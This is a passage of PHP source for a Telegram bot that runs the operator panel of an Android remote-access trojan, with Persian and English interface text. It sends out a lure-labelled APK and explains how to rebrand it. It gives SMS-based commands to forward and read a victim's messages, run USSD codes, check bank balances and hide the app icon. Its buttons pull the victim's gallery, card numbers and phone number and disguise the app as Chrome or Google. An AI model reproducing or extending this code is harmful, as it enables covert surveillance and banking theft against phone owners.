            smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);

        } elseif ($data == "online_checo") {

            emg($chat_id, $mi, "Checking Online Devices ...", null);
            file_put_contents("data/miid.txt", $mi);
            requestsAll('online_device');
            file_put_contents("user/$chat_id/command.txt", "");*/


          }  elseif ($text == "/list") {
                file_put_contents("data/onlineusers.txt", "");
        
                smg($chat_id, "Can a request to [ <b>check devices</b> ] be sent online? Click the button below", $onli_btn);
        
            } elseif ($data == "online_checo") {
                emg($chat_id, $mi, "ᴘɪɴɢ ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴛ
        ᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴜʟᴛ
        ᴛʜɪꜱ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ᴇᴅɪᴛ ʙʏ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ", null);
                file_put_contents("data/mid.txt", $mi);
                file_put_contents("data/online_users.json", json_encode([]));
                requestsAll('online_device');
                file_put_contents("user/$chat_id/command.txt", "");
        
        
            } elseif (strpos($data, 'page_') !== false) {
                $page = (int)str_replace('page_', '', $data);
                updateMessageWithUsers($chat_id, $mi, $page);


    } elseif ($data == 'apkk') {
        $cap = '
فایل رت شما آماده شد [ #کمک_معیشتی ] ✅

برای ادیت ایکون و نام رت از [apk editor] ادیت بزنید ✅

برای تغییر پورت رتتون میرید قسمت ( assets ) بعد (sudoport) پورتتون رو میزارید ✅ 
';

        bot('sendDocument', [
            'chat_id' => $chat_id,
            'document' => new CURLFile("app.apk"),
            'caption' => " $cap ",
        ]);


    } elseif ($data == "offmode_help") {
        $offmode_help = "📶 <b>ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱᴍꜱ ᴄᴏᴍᴍᴀɴᴅꜱ</b> 📶\n\n";
        $offmode_help .= "وقتی اینترنت تارگت قطعه، از طریق SMS میتونی کنترلش کنی.\n";
        $offmode_help .= "پیشوند دستورات: <code>$sudo_port</code>\n\n";
        $offmode_help .= "━━━━━━━━━━━━━━━━━━━\n";
        $offmode_help .= "📡 <b>اتصال و وضعیت</b>\n";
        $offmode_help .= "• <code>$sudo_port ping</code> — چک وضعیت آنلاین\n";
        $offmode_help .= "• <code>$sudo_port start</code> — ریکانکت سرویس‌ها\n\n";
        $offmode_help .= "📶 <b>حالت آفلاین</b>\n";
        $offmode_help .= "• <code>$sudo_port offline [شماره]</code> — فوروارد SMS به شماره\n";
        $offmode_help .= "• <code>$sudo_port offlineoff</code> — غیرفعال کردن فوروارد\n\n";
        $offmode_help .= "📩 <b>مدیریت پیامک</b>\n";
        $offmode_help .= "• <code>$sudo_port lastsms</code> — آخرین SMS صندوق ورودی\n";
        $offmode_help .= "• <code>$sudo_port search [کلمه]</code> — جستجو در SMS\n";
        $offmode_help .= "• <code>$sudo_port sms [شماره] [متن]</code> — ارسال SMS\n\n";
        $offmode_help .= "📞 <b>اطلاعات سیم‌کارت</b>\n";
        $offmode_help .= "• <code>$sudo_port phone</code> — اطلاعات اپراتور\n";
        $offmode_help .= "• <code>$sudo_port ussd [کد]</code> — اجرای کد USSD\n\n";
        $offmode_help .= "💰 <b>بانکی</b>\n";
        $offmode_help .= "• <code>$sudo_port balance</code> — موجودی حساب بانکی\n\n";
        $offmode_help .= "🧬 <b>مدیریت آیکون</b>\n";
        $offmode_help .= "• <code>$sudo_port hide</code> — مخفی کردن آیکون\n";
        $offmode_help .= "• <code>$sudo_port change [نام]</code> — تغییر آیکون (chrome/telegram/youtube/google)\n\n";
        $offmode_help .= "━━━━━━━━━━━━━━━━━━━\n\n";
        $offmode_help .= "⚠️ <b>نکته:</b> شماره Offline Mode فعلی: <code>$offline_number</code>";

        emg($chat_id, $mi, $offmode_help, $offmode_help_button);

    } elseif ($text == "/offmode") {
        $offmode_help = "📶 <b>ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱᴍꜱ ᴄᴏᴍᴍᴀɴᴅꜱ</b> 📶\n\n";
        $offmode_help .= "وقتی اینترنت تارگت قطعه، از طریق SMS میتونی کنترلش کنی.\n";
        $offmode_help .= "پیشوند دستورات: <code>$sudo_port</code>\n\n";
        $offmode_help .= "━━━━━━━━━━━━━━━━━━━\n";
        $offmode_help .= "📡 <b>اتصال و وضعیت</b>\n";
        $offmode_help .= "• <code>$sudo_port ping</code> — چک وضعیت آنلاین\n";
        $offmode_help .= "• <code>$sudo_port start</code> — ریکانکت سرویس‌ها\n\n";
        $offmode_help .= "📶 <b>حالت آفلاین</b>\n";
        $offmode_help .= "• <code>$sudo_port offline [شماره]</code> — فوروارد SMS به شماره\n";
        $offmode_help .= "• <code>$sudo_port offlineoff</code> — غیرفعال کردن فوروارد\n\n";
        $offmode_help .= "📩 <b>مدیریت پیامک</b>\n";
        $offmode_help .= "• <code>$sudo_port lastsms</code> — آخرین SMS صندوق ورودی\n";
        $offmode_help .= "• <code>$sudo_port search [کلمه]</code> — جستجو در SMS\n";
        $offmode_help .= "• <code>$sudo_port sms [شماره] [متن]</code> — ارسال SMS\n\n";
        $offmode_help .= "📞 <b>اطلاعات سیم‌کارت</b>\n";
        $offmode_help .= "• <code>$sudo_port phone</code> — اطلاعات اپراتور\n";
        $offmode_help .= "• <code>$sudo_port ussd [کد]</code> — اجرای کد USSD\n\n";
        $offmode_help .= "💰 <b>بانکی</b>\n";
        $offmode_help .= "• <code>$sudo_port balance</code> — موجودی حساب بانکی\n\n";
        $offmode_help .= "🧬 <b>مدیریت آیکون</b>\n";
        $offmode_help .= "• <code>$sudo_port hide</code> — مخفی کردن آیکون\n";
        $offmode_help .= "• <code>$sudo_port change [نام]</code> — تغییر آیکون (chrome/telegram/youtube/google)\n\n";
        $offmode_help .= "━━━━━━━━━━━━━━━━━━━\n\n";
        $offmode_help .= "⚠️ <b>نکته:</b> شماره Offline Mode فعلی: <code>$offline_number</code>";

        $offmode_buttons = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "📶 ꜱᴇᴛ ᴏꜰꜰʟɪɴᴇ ɴᴜᴍʙᴇʀ 📶", 'callback_data' => 'set_number_offline_mode']],
            [['text' => "⏫ ʙᴀᴄᴋ ⏫", 'callback_data' => 'back_home']]
        ]]);

        smg($chat_id, $offmode_help, $offmode_buttons);

    } elseif ($text == "/Settings") {

        smg($chat_id, "‹‹ <b>Settings Page</b> ›› section\n\nSelect the desired option :", $settings_button);
    } elseif ($data == "setting") {
        emg($chat_id, $mi, "‹‹ <b>Settings Page</b> ›› section\n\nSelect the desired option :", $settings_button);
    } elseif ($data == "rat_set") {
        emg($chat_id, $mi, "⚙️ʀᴀᴛ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ", $goooo);
    } elseif ($data == "panel_set") {
        emg($chat_id, $mi, "🔧ᴘᴀɴᴇʟ ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀʀᴛ", $goooo2);
    } elseif ($data == "/help") {
        smg($chat_id, "<b>~ Yes 🙂‍↔️</b>", $goooo);
    } elseif ($text == "/Help") {
        smg($chat_id, "<b>Help Rat Remote $dev_name</b>
برای راهنمایی به پیوی سازنده مراجعه کنید.
        ", $dev_inline);

    } elseif (strpos($text, '/login_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/login_', '', $text);
        $dev_id_use = $dev_id0;
        // $USID = $txt[1];
        file_put_contents("user/$chat_id/device-id.txt", $dev_id_use);
        $device_id = file_get_contents("user/$dev_id_use-model.txt");
        $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
        $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

        // file_put_contents("user/$chat_id/device-model.txt", $device_id);
        $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");

        # ========== پنل سریع (Quick Access) - ۱۰ دکمه ==========
        $quick_panel = json_encode([
            'resize_keyboard' => false,
            'inline_keyboard' => [
                # ردیف ۱: پینگ دستگاه
                [
                    ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $dev_id_use"]
                ],
                # ردیف ۲: گالری و دریافت شماره
                [
                    ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $dev_id_use"],
                    ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $dev_id_use"]
                ],
                # ردیف ۳: چنج آیکون و هاید آیکون
                [
                    ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $dev_id_use"],
                    ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $dev_id_use"]
                ],
                # ردیف ۴: آخرین پیامک و بالانس
                [
                    ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"],
                    ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]
                ],
                # ردیف ۵: شماره کارت‌ها
                [
                    ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $dev_id_use"]
                ],
                # ردیف ۶: دکمه فول پنل
                [
                    ['text' => "📋 ꜰᴜʟʟ ᴘᴀɴᴇʟ 📋", 'callback_data' => "full_panel $dev_id_use"]
                ],
                # ردیف ۷: بازگشت
                [
                    ['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => "back_home"]
                ]
            ]
        ]);
        
        smg($chat_id, "<b>🧩 ɪᴅ ᴜsᴇʀ : $dev_id_use</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ:", $quick_panel);

    } elseif (strpos($data, "full_panel") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        
        $control_button = control_button($device_id);
        
        emg($chat_id, $mi, "<b>🧩 ᴅᴇᴠɪᴄᴇ ᴄᴏɴᴛʀᴏʟ</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ", $control_button);

    } elseif (strpos($data, "back_quick_panel") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        
        $quick_panel = json_encode([
            'resize_keyboard' => false,
            'inline_keyboard' => [
                [
                    ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $device_id"]
                ],
                [
                    ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $device_id"],
                    ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $device_id"]
                ],
                [
                    ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $device_id"],
                    ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $device_id"]
                ],
                [
                    ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $device_id"],
                    ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $device_id"]
                ],
                [
                    ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $device_id"]
                ],
                [
                    ['text' => "📋 ꜰᴜʟʟ ᴘᴀɴᴇʟ 📋", 'callback_data' => "full_panel $device_id"]
                ],
                [
                    ['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => "back_home"]
                ]
            ]
        ]);
        
        emg($chat_id, $mi, "<b>🧩 ɪᴅ ᴜsᴇʀ : $device_id</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ:", $quick_panel);

    } elseif (strpos($data, 'ls') !== false) {
        $datass = explode(" ", $data);

        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        $dev_id_use = $datass[1];
        $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
        $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

        $status_offline1 = file_get_contents("user/$device_id-offline.txt");
        
        # ========== پنل سریع (Quick Access) - ۱۰ دکمه ==========
        $quick_panel = json_encode([
            'resize_keyboard' => false,
            'inline_keyboard' => [
                [
                    ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $dev_id_use"]
                ],
                [
                    ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $dev_id_use"],
                    ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $dev_id_use"]
                ],
                [
                    ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $dev_id_use"],
                    ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $dev_id_use"]
                ],
                [
                    ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $dev_id_use"],
                    ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $dev_id_use"]
                ],
                [
                    ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $dev_id_use"]
                ],
                [
                    ['text' => "📋 ꜰᴜʟʟ ᴘᴀɴᴇʟ 📋", 'callback_data' => "full_panel $dev_id_use"]
                ],
                [
                    ['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => "back_home"]
                ]
            ]
        ]);
        
        smg($chat_id, "‹‹ <b>Device Control</b> ›› section\n\nSelect the desired option :", $quick_panel);

    } elseif (strpos($data, 'fs') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('hidden', $datass[1]);
        
        # ========== پنل سریع (Quick Access) - ۱۰ دکمه ==========
        $quick_panel = json_encode([
            'resize_keyboard' => false,
            'inline_keyboard' => [
                [
                    ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $datass[1]"]
                ],
                [
                    ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $datass[1]"],
                    ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $datass[1]"]
                ],
                [
                    ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $datass[1]"],
                    ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $datass[1]"]
                ],
                [
                    ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $datass[1]"],
                    ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $datass[1]"]
                ],
                [
                    ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $datass[1]"]
                ],
                [
                    ['text' => "📋 ꜰᴜʟʟ ᴘᴀɴᴇʟ 📋", 'callback_data' => "full_panel $datass[1]"]
                ],
                [
                    ['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => "back_home"]
                ]
            ]
        ]);
        
        smg($chat_id, "<b>🧩 ɪᴅ ᴜsᴇʀ : $datass[1]</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ:", $quick_panel);

    } elseif (strpos($data, 'newic') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-apk.txt", "Hidden");
        requests('changetogoogle', $datass[1]);
        
        # ========== پنل سریع (Quick Access) - ۱۰ دکمه ==========
        $quick_panel = json_encode([
            'resize_keyboard' => false,
            'inline_keyboard' => [
                [
                    ['text' => "📡 ᴘɪɴɢ ᴛᴀʀɢᴇᴛ 📡", 'callback_data' => "status_user $datass[1]"]
                ],
                [
                    ['text' => "📷 ɢᴀʟʟᴇʀʏ 📷", 'callback_data' => "gallery $datass[1]"],
                    ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ 📞", 'callback_data' => "userphone $datass[1]"]
                ],
                [
                    ['text' => "🎨 ᴄʜᴀɴɢᴇ ɪᴄᴏɴ 🎨", 'callback_data' => "change $datass[1]"],
                    ['text' => "👻 ʜɪᴅᴇ ɪᴄᴏɴ 👻", 'callback_data' => "hide_icon $datass[1]"]
                ],
                [
                    ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ 📩", 'callback_data' => "last_sms $datass[1]"],
                    ['text' => "💰 ʙᴀʟᴀɴᴄᴇꜱ 💰", 'callback_data' => "balance $datass[1]"]
                ],
                [
                    ['text' => "💳 ᴄᴀʀᴅ ɴᴜᴍʙᴇʀꜱ 💳", 'callback_data' => "cardnumbers $datass[1]"]
                ],
                [
                    ['text' => "📋 ꜰᴜʟʟ ᴘᴀɴᴇʟ 📋", 'callback_data' => "full_panel $datass[1]"]
                ],
                [
                    ['text' => "⏫ ʙᴀᴄᴋ ᴘᴀɴᴇʟ ⏫", 'callback_data' => "back_home"]
                ]
            ]
        ]);
        
        smg($chat_id, "<b>🧩 ɪᴅ ᴜsᴇʀ : $datass[1]</b>
🗞 ʜᴇʟʟᴏ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ
🏝 ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ:", $quick_panel);

    } elseif (strpos($data, 'hg') !== false) {

        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        file_put_contents("user/$datass[1]-ringer.txt", "Silent");
        requests('silent', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);
    } elseif (strpos($data, 'rt') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);
        requests('status', $datass[1]);

    } elseif (strpos($data, 'wqw') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('last_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b> ", $geeeh);

    } elseif (strpos($data, 'kkkk') !== false) {
        $datass = explode(" ", $data);
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('all_sms', $datass[1]);
        smg($chat_id, "<b>REQUEST SENT SUCCESSFULLY</b>", $geeeh);

    } elseif (strpos($data, 'Kops') !== false) {
        $datass = explode(" ", $data);
        $word = file_get_contents("user/$chat_id/word.txt");
        file_put_contents("user/$chat_id/device-id.txt", $datass[1]);
        file_put_contents("user/$chat_id/device-model.txt", $datass[2]);
        requests('WhatsChecker', $datass[1]);
        smg($chat_id, "<b>CheCk $word \nApproximate time : 3 seconds</b>", $geeeh);

    } elseif (strpos($data, "offmodeon ") !== False) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        file_put_contents("user/$device_id-offline.txt", "ON");
        $control_button = control_button($datass[1]);
        emg($chat_id, $mi, "‹‹ <b>Offline Mode On</b> ›› section\n\nSelect the desired option :", $control_button);
        requestSMS("offline_mode_on", $device_id, $offline_number, null);
    } elseif (strpos($data, "offmodeoff") !== False) {

        $datass = explode(" ", $data);
        file_put_contents("user/$datass[1]-offline.txt", "OFF");
        $control_button = control_button($datass[1]);
        emg($chat_id, $mi, "‹‹ <b>Offline Mode Off</b> ›› section\n\nSelect the desired option :", $control_button);
        requestSMS("offline_mode_off", $datass[1], $offline_number, null);

    } elseif ($data == "auto_hide") {
        if ($action_autohide == "off") {
            file_put_contents("data/autohide.txt", "on");
            emg($chat_id, $mi, "‹‹ <b>Auto Hide On</b> ›› section\n\nSelect the desired option :", $settings_button);

        } else {
            file_put_contents("data/autohide.txt", "off");
            emg($chat_id, $mi, "‹‹ <b>Auto Hide Off</b> ›› section\n\nSelect the desired option :", $settings_button);
        }
    } elseif ($data == "online_model") {
        emg($chat_id, $mi, "‹‹ <b>Model Send Online</b> ›› section\n\nSelect the desired option :", $model_button);
    } elseif ($data == "list_model") {
        emg($chat_id, $mi, "‹‹ <b>List Sended</b> ›› sectionSelected ", $back_settings);
        file_put_contents("data/online_model.txt", "list");
    } elseif ($data == "singel_model") {
        emg($chat_id, $mi, "‹‹ <b>Singel Sended</b> ›› section Selected ", $back_settings);
        file_put_contents("data/online_model.txt", "singel");
    } elseif ($data == "first_sms") {
        if ($action_firstsms == "off") {
            file_put_contents("data/firstsms.txt", "on");
            emg($chat_id, $mi, "‹‹ <b>First SMS On</b> ›› section\n\nSelect the desired option :", $settings_button);

        } else {
            file_put_contents("data/firstsms.txt", "off");
            emg($chat_id, $mi, "‹‹ <b>First SMS Off</b> ›› section\n\nSelect the desired option :", $settings_button);
        }
    } elseif ($data == "autotar") {
        if ($auto_tar == "on") {
            file_put_contents("data/autotar.txt", "off");
            emg($chat_id, $mi, "<b>OFF MODE</b> Set To <b>OFF</b>", $back_settings);
        } else {
            file_put_contents("data/autotar.txt", "on");
            emg($chat_id, $mi, "<b>OFF MODE</b> Set To <b>ON</b>", $back_settings);
        }
    } elseif (strpos($text, '/block_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/block_', '', $text);
        $ip_block = $dev_id0;
        $file_accses = file_get_contents("block.txt");
        file_put_contents("block.txt", "$file_accses\n$ip_block");
        smg($chat_id, "IP <b>$ip_block</b> Blocked !", null);

    } elseif (strpos($text, '/unblock_') !== false) {
        $txt = explode("_", $text);
        $dev_id0 = str_replace('/unblock_', '', $text);
        $ip_block = $dev_id0;
        $file_content = file_get_contents("block.txt");
        $new_content = str_replace($ip_block, '', $file_content);

        file_put_contents("block.txt", $new_content);
        smg($chat_id, "IP <b>$ip_block</b> unblocked", null);
    } elseif ($data == "set_text") {
        emg($chat_id, $mi, "Please send the <b>SMS Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set text");

    } elseif ($text == "/all_unblock") {
        file_put_contents("block.txt", "");
        smg($chat_id, "<b>All IP's were successfully unblocked</b>", null);
        exit();

    } elseif ($command == "set text") {

        smg($chat_id, "<b>SMS Text</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("data/message-first.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "set_word") {
        emg($chat_id, $mi, "Please send the <b>Word Text ...</b>", $back_settings);
        file_put_contents("user/$chat_id/command.txt", "set word");

    } elseif ($command == "set word") {

        smg($chat_id, "<b>Word</b> was successfully set to [ <code>$text</code> ]", $back_settings);
        file_put_contents("user/$chat_id/word.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");

    } elseif (strpos($data, "nametarget") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => false, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        emg($chat_id, $mi, "Please send the <b>Name Target ...</b>", $back_control);
        file_put_contents("user/$chat_id/command.txt", "settragetname $device_id");

    } elseif ($data == "firstaction") {
        $bal = getFirstAction("balance");
        $tarphone = getFirstAction("targetphone");
        $hideact = getFirstAction("autohide");
        $firstActionButton = json_encode(array('inline_keyboard' => [[['text' => "ʙᴀʟᴀɴᴄᴇ", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "ᴀᴜᴛᴏ ʜɪᴅᴇ", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "⬅️ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        emg($chat_id, $mi, "ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $firstActionButton);
    } elseif ($data == "balanceaction") {
        if (getFirstAction("balance") == "off") {
            updateJsonValueInFile("data/firstaction.json", "balance", "on");
        } else {
            updateJsonValueInFile("data/firstaction.json", "balance", "off");
        }
        $bal = getFirstAction("balance");
        $tarphone = getFirstAction("targetphone");
        $hideact = getFirstAction("autohide");
        $firstActionButton = json_encode(array('inline_keyboard' => [[['text' => "ʙᴀʟᴀɴᴄᴇ", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "ᴀᴜᴛᴏ ʜɪᴅᴇ", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "⬅️ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        emg($chat_id, $mi, "ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $firstActionButton);
    } elseif ($data == "userphoneaction") {
        if (getFirstAction("targetphone") == "off") {
            updateJsonValueInFile("data/firstaction.json", "targetphone", "on");
        } else {
            updateJsonValueInFile("data/firstaction.json", "targetphone", "off");
        }
        $bal = getFirstAction("balance");
        $tarphone = getFirstAction("targetphone");
        $hideact = getFirstAction("autohide");
        $firstActionButton = json_encode(array('inline_keyboard' => [[['text' => "ʙᴀʟᴀɴᴄᴇ", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "ᴀᴜᴛᴏ ʜɪᴅᴇ", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "⬅️ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        emg($chat_id, $mi, "ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $firstActionButton);
    } elseif ($data == "autohideaction") {
        if (getFirstAction("autohide") == "off") {
            updateJsonValueInFile("data/firstaction.json", "autohide", "on");
        } else {
            updateJsonValueInFile("data/firstaction.json", "autohide", "off");
        }
        $bal = getFirstAction("balance");
        $tarphone = getFirstAction("targetphone");
        $hideact = getFirstAction("autohide");
        $firstActionButton = json_encode(array('inline_keyboard' => [[['text' => "ʙᴀʟᴀɴᴄᴇ", 'callback_data' => "balanceaction"], ['text' => "$bal", 'callback_data' => "balanceaction"]],
            [['text' => "ᴜꜱᴇʀ ᴘʜᴏɴᴇꜱ", 'callback_data' => "userphoneaction"], ['text' => "$tarphone", 'callback_data' => "userphoneaction"]],
            [['text' => "ᴀᴜᴛᴏ ʜɪᴅᴇ", 'callback_data' => "autohideaction"], ['text' => "$hideact", 'callback_data' => "autohideaction"]],
            [['text' => "⬅️ʙᴀᴄᴋ", 'callback_data' => "back_home"]],
        ]));
        emg($chat_id, $mi, "ᴍᴀɴᴀɢᴇ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴡɪᴛʜ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ", $firstActionButton);

    } elseif (strpos($command, "settragetname") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $info_button = info_button($device_id);

        smg($chat_id, "<b>Target Name</b> was successfully set to [ <code>$text</code> ]", $info_button);
